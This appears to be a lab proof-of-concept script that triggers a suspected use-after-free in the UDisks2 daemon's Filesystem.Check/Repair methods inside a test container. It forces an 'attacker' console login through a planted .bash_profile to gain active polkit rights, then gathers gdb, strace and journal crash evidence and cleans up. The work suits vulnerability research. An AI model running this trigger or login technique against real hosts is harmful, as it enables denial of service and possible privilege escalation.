#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/udisks-filesystem-mounted-uaf-20260517.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

echo "UDisks mounted Filesystem.Check/Repair missing-goto UAF probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail

TAG=udisks-filesystem-mounted-uaf-20260517
WORK="/tmp/$TAG"
ACTIVE_USER="${ACTIVE_USER:-attacker}"
ACTIVE_HOME="/home/$ACTIVE_USER"
ACTIVE_UID="$(id -u "$ACTIVE_USER")"
HOME_WORK="$ACTIVE_HOME/$TAG"
PROFILE="$ACTIVE_HOME/.bash_profile"
PROFILE_BAK="$WORK/bash_profile.backup"
PROFILE_HAD="$WORK/bash_profile.had"
CONSOLE="${CONSOLE:-9}"
ROOT_MARKER="/root/udisks_filesystem_mounted_uaf_root"
RUN_MARKER="/run/udisks_filesystem_mounted_uaf_root"
TMP_MARKER="/tmp/udisks_filesystem_mounted_uaf_root"
GDB_PID=""
STRACE_PID=""

cleanup_target() {
  set +e
  [ -n "${GDB_PID:-}" ] && kill "$GDB_PID" >/dev/null 2>&1
  [ -n "${STRACE_PID:-}" ] && kill "$STRACE_PID" >/dev/null 2>&1
  loginctl terminate-user "$ACTIVE_USER" >/dev/null 2>&1
  systemctl start "getty@tty${CONSOLE}.service" >/dev/null 2>&1
  if [ -e "$PROFILE_HAD" ] && [ -e "$PROFILE_BAK" ]; then
    cp -a "$PROFILE_BAK" "$PROFILE"
    chown "$ACTIVE_USER:$ACTIVE_USER" "$PROFILE"
  else
    rm -f "$PROFILE"
  fi
  findmnt -rn -o TARGET,SOURCE | awk -v tag="$TAG" '$0 ~ tag {print $1}' |
    sort -r | xargs -r -n1 umount >/dev/null 2>&1
  losetup -a | awk -F: -v tag="$TAG" '$0 ~ tag {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1
  rm -rf "$HOME_WORK" "$WORK"
  rm -f "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"
  systemctl restart udisks2.service >/dev/null 2>&1
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    if ! losetup -a | grep -q "$TAG"; then
      break
    fi
    losetup -a | awk -F: -v tag="$TAG" '$0 ~ tag {print $1}' |
      xargs -r -n1 losetup -d >/dev/null 2>&1
    sleep 1
  done
  systemctl reset-failed udisks2.service "getty@tty${CONSOLE}.service" >/dev/null 2>&1
}
trap cleanup_target EXIT

section() {
  printf '\n== %s ==\n' "$1"
}

install_debug_tools_if_missing() {
  local missing=()
  for bin in gdb strace python3 openvt udisksctl gdbus mkfs.ext4; do
    command -v "$bin" >/dev/null 2>&1 || missing+=("$bin")
  done
  python3 - <<'PY' >/dev/null 2>&1 || missing+=("python3-dbus")
import dbus
PY
  if [ "${#missing[@]}" -gt 0 ]; then
    echo "installing evidence-only tools: ${missing[*]}"
    apt-get update
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
      gdb strace python3-dbus kbd udisks2 e2fsprogs
  fi
}

write_helpers() {
  rm -rf "$WORK" "$HOME_WORK"
  install -d -m 0755 "$WORK"
  install -d -o "$ACTIVE_USER" -g "$ACTIVE_USER" -m 0700 "$HOME_WORK"
  if [ -e "$PROFILE" ]; then
    cp -a "$PROFILE" "$PROFILE_BAK"
    touch "$PROFILE_HAD"
  fi

  cat >"$WORK/persistent-call.py" <<'PY'
#!/usr/bin/env python3
import sys
import time
import dbus

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} OBJECT_PATH METHOD", file=sys.stderr)
    raise SystemExit(2)

object_path, method = sys.argv[1:3]
bus = dbus.SystemBus()
obj = bus.get_object("org.freedesktop.UDisks2", object_path)
filesystem = dbus.Interface(obj, "org.freedesktop.UDisks2.Filesystem")
options = dbus.Dictionary({}, signature="sv")

print(f"unique_name={bus.get_unique_name()}", flush=True)
try:
    if method == "Check":
        result = filesystem.Check(options, timeout=120)
    elif method == "Repair":
        result = filesystem.Repair(options, timeout=120)
    else:
        raise ValueError(method)
    print(f"result={result!r}", flush=True)
except Exception as exc:
    print(f"exception={type(exc).__name__}: {exc}", flush=True)

print("holding_system_bus_name=8s", flush=True)
time.sleep(8)
PY
  chmod 0755 "$WORK/persistent-call.py"

  cat >"$HOME_WORK/user-probe.sh" <<'USER_PROBE'
#!/usr/bin/env bash
set +e
TAG=udisks-filesystem-mounted-uaf-20260517
WORK="/tmp/$TAG"
METHOD="$(cat "$WORK/method")"
OUT="$WORK/user-$METHOD.log"
exec >"$OUT" 2>&1

ROOT_MARKER="/root/udisks_filesystem_mounted_uaf_root"
RUN_MARKER="/run/udisks_filesystem_mounted_uaf_root"
TMP_MARKER="/tmp/udisks_filesystem_mounted_uaf_root"

echo "method=$METHOD"
echo "identity=$(id)"
echo "tty=$(tty)"
echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" \
    -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
fi
echo
echo "polkit_active_checks"
for aid in \
  org.freedesktop.udisks2.loop-setup \
  org.freedesktop.udisks2.filesystem-mount \
  org.freedesktop.udisks2.modify-device; do
  pkcheck --process $$ --action-id "$aid" --allow-user-interaction >/dev/null 2>&1
  echo "$aid rc=$?"
done

img="$HOME/$TAG/${METHOD}.ext4.img"
rm -f "$img"
truncate -s 96M "$img"
mkfs.ext4 -F -q -L "UAF${METHOD}" "$img"
echo "image=$img"

loop_out="$(udisksctl loop-setup -f "$img" --no-user-interaction 2>&1)"
loop_rc=$?
echo "$loop_out"
echo "loop_setup_rc=$loop_rc"
dev="$(printf '%s\n' "$loop_out" | sed -n 's/.* as \(\/dev\/loop[0-9][0-9]*\).*/\1/p' | tail -n 1)"
echo "dev=$dev"
[ -n "$dev" ] || exit 20
base="${dev##*/}"
obj="/org/freedesktop/UDisks2/block_devices/$base"
echo "obj=$obj"

udevadm settle --timeout=15 2>&1 || true
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path "$obj" \
  --method org.freedesktop.UDisks2.Block.Rescan "{}" 2>&1 || true
sleep 1

mount_out="$(udisksctl mount -b "$dev" --no-user-interaction 2>&1)"
mount_rc=$?
echo "$mount_out"
echo "mount_rc=$mount_rc"
findmnt "$dev" || true
echo
python3 "$WORK/persistent-call.py" "$obj" "$METHOD"
echo "method_call_rc=$?"
findmnt "$dev" || true
ls -l "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER" 2>&1 || true
USER_PROBE
  chmod 0755 "$HOME_WORK/user-probe.sh"
  chown -R "$ACTIVE_USER:$ACTIVE_USER" "$HOME_WORK"

  cat >"$PROFILE" <<EOF
"$HOME_WORK/user-probe.sh"
exit
EOF
  chown "$ACTIVE_USER:$ACTIVE_USER" "$PROFILE"
  chmod 0644 "$PROFILE"
}

write_gdb_cmd() {
  cat >"$WORK/gdb-check.cmd" <<'GDB'
set pagination off
set confirm off
set breakpoint pending on
set print thread-events off
set detach-on-fork on
set follow-fork-mode parent
handle SIGPIPE nostop noprint pass
handle SIGSEGV stop print pass

break g_dbus_method_invocation_return_dbus_error
commands
silent
printf "HIT return_dbus_error inv=%p error=%s message=%s\n", $x0, (char *) $x1, (char *) $x2
bt 8
continue
end

break udisks_daemon_util_check_authorization_sync_with_error
commands
silent
printf "HIT auth_with_error action=%s invocation=%p\n", (char *) $x2, $x5
bt 8
continue
end

break bd_fs_check
commands
silent
printf "HIT bd_fs_check device=%s type=%s\n", (char *) $x0, (char *) $x1
bt 10
continue
end

break bd_fs_repair
commands
silent
printf "HIT bd_fs_repair device=%s type=%s\n", (char *) $x0, (char *) $x1
bt 10
continue
end

continue
printf "GDB_STOPPED_AFTER_CONTINUE\n"
bt 20
info registers
thread apply all bt 12
detach
quit
GDB
}

run_active_method() {
  local method="$1"
  echo "$method" >"$WORK/method"
  rm -f "$WORK/user-$method.log" "$WORK/openvt-$method.log"
  : >"$WORK/user-$method.log"
  chown "$ACTIVE_USER:$ACTIVE_USER" "$WORK/user-$method.log"
  systemctl stop "getty@tty${CONSOLE}.service" >/dev/null 2>&1 || true
  set +e
  timeout 160 openvt -c "$CONSOLE" -s -f -w -- /bin/login -f "$ACTIVE_USER" >"$WORK/openvt-$method.log" 2>&1
  local rc=$?
  set -e
  echo "openvt_$method rc=$rc"
  systemctl start "getty@tty${CONSOLE}.service" >/dev/null 2>&1 || true
  loginctl terminate-user "$ACTIVE_USER" >/dev/null 2>&1 || true
}

run_gdb_check() {
  section "fresh gdb Check trigger"
  systemctl restart udisks2.service
  local pid
  pid="$(pidof udisksd | awk '{print $1}')"
  echo "udisksd_pid=$pid"
  write_gdb_cmd
  set +e
  timeout 120 gdb -q -batch -p "$pid" -x "$WORK/gdb-check.cmd" >"$WORK/gdb-check.log" 2>&1 &
  GDB_PID=$!
  sleep 2
  run_active_method Check
  wait "$GDB_PID"
  echo "gdb_check_rc=$?"
  GDB_PID=""
  set -e
  systemctl restart udisks2.service >/dev/null 2>&1 || true
}

run_strace_repair() {
  section "fresh strace Repair trigger"
  systemctl restart udisks2.service
  local pid
  pid="$(pidof udisksd | awk '{print $1}')"
  echo "udisksd_pid=$pid"
  set +e
  timeout 90 strace -ff -s 300 -v -e trace=execve -o "$WORK/strace-repair" -p "$pid" >"$WORK/strace-repair.attach.out" 2>"$WORK/strace-repair.attach.err" &
  STRACE_PID=$!
  sleep 1
  run_active_method Repair
  wait "$STRACE_PID"
  echo "strace_repair_rc=$?"
  STRACE_PID=""
  set -e
  systemctl restart udisks2.service >/dev/null 2>&1 || true
}

section "baseline"
install_debug_tools_if_missing
rm -f "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"
cat /etc/os-release | sed -n '1,8p'
uname -a
getent passwd attacker selfauth || true
id "$ACTIVE_USER"
echo "active_probe_user=$ACTIVE_USER uid=$ACTIVE_UID home=$ACTIVE_HOME"
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  udisks2 libudisks2-0 libblockdev3 libblockdev-fs3 polkitd policykit-1 dbus systemd \
  e2fsprogs strace gdb python3-dbus 2>&1 | sort || true
systemctl is-enabled udisks2.service 2>&1 || true
systemctl is-active udisks2.service 2>&1 || true
systemctl cat udisks2.service --no-pager | sed -n '1,80p'

section "polkit defaults"
python3 - <<'PY'
import xml.etree.ElementTree as ET
ids = [
    "org.freedesktop.udisks2.loop-setup",
    "org.freedesktop.udisks2.filesystem-mount",
    "org.freedesktop.udisks2.modify-device",
    "org.freedesktop.udisks2.modify-device-system",
    "org.freedesktop.udisks2.modify-device-other-seat",
]
root = ET.parse("/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy").getroot()
by_id = {a.attrib.get("id"): a for a in root.findall("action")}
for aid in ids:
    d = by_id[aid].find("defaults")
    vals = {c.tag: (c.text or "").strip() for c in list(d)}
    print(f"{aid}\tany={vals.get('allow_any')}\tinactive={vals.get('allow_inactive')}\tactive={vals.get('allow_active')}")
PY

section "source evidence"
nl -ba /tmp/udisks2-2.10.1/src/udiskslinuxfilesystem.c | sed -n '2079,2228p'
nl -ba /tmp/udisks2-2.10.1/src/udiskslinuxfilesystem.c | sed -n '2247,2396p'

write_helpers
run_gdb_check
run_strace_repair

section "user trigger logs"
for method in Check Repair; do
  echo "--- user-$method.log ---"
  sed -n '1,220p' "$WORK/user-$method.log" 2>&1 || true
  echo "--- openvt-$method.log ---"
  sed -n '1,80p' "$WORK/openvt-$method.log" 2>&1 || true
done

section "gdb evidence"
grep -E 'HIT return_dbus_error|Cannot check|HIT auth_with_error|HIT bd_fs_check|SIGSEGV|GDB_STOPPED|^#0|g_type_check|Thread|received signal' \
  "$WORK/gdb-check.log" 2>&1 | sed -n '1,240p' || true
echo "--- gdb tail ---"
tail -n 120 "$WORK/gdb-check.log" 2>&1 || true

section "strace execve evidence"
cat "$WORK"/strace-repair.* 2>/dev/null | grep -E 'execve\(' | sed -n '1,120p' || true
echo "--- strace attach stderr ---"
sed -n '1,80p' "$WORK/strace-repair.attach.err" 2>&1 || true

section "journal crash evidence"
journalctl -b -u udisks2.service --no-pager -n 120 2>&1 |
  grep -E "$TAG|Mounted /dev/loop|Cannot (check|repair)|status=11|SEGV|udisks daemon version|Started udisks2" |
  tail -n 80 || true

section "root proof check before cleanup"
for p in "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"; do
  if [ -e "$p" ]; then
    stat -Lc '%A %a %U:%G %n' "$p"
    sed -n '1,20p' "$p" || true
  else
    echo "ABSENT $p"
  fi
done
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_PROOF=YES"
else
  echo "ROOT_PROOF=NO"
fi

section "cleanup proof"
cleanup_target
trap - EXIT
for p in "$WORK" "$HOME_WORK" "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"; do
  [ -e "$p" ] && echo "PRESENT $p" || echo "ABSENT $p"
done
echo "udisks2_active=$(systemctl is-active udisks2.service 2>&1 || true)"
echo "failed_units:"
systemctl --failed --no-legend 2>&1 || true
echo "our_loop_devices:"
losetup -a | grep "$TAG" || echo "none"
echo "our_mounts:"
findmnt -rn -o SOURCE,TARGET | grep "$TAG" || echo "none"
TARGET_SCRIPT

echo
echo "wrote $LOG"
